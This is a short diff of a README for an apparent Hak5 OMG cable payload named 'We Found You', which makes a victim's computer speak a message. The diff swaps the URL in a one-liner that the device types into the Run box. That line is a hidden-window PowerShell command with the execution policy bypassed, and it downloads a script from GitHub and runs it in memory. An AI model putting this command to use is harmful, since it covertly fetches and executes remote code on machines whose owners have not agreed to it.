@@ -40,7 +40,7 @@ And sapi speak with talk through their speakers the message provided or a custom
 * Plug in your device
 * Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
 ```
-powershell -w h -NoP -NonI -Ep Bypass iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-We-Found-You/found-you.ps1?dl=1 | iex
+powershell -w h -NoP -NonI -Ep Bypass iwr https://raw.githubusercontent.com/I-Am-Jakoby/1/main/wefoundyou.ps1 | iex
 ```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
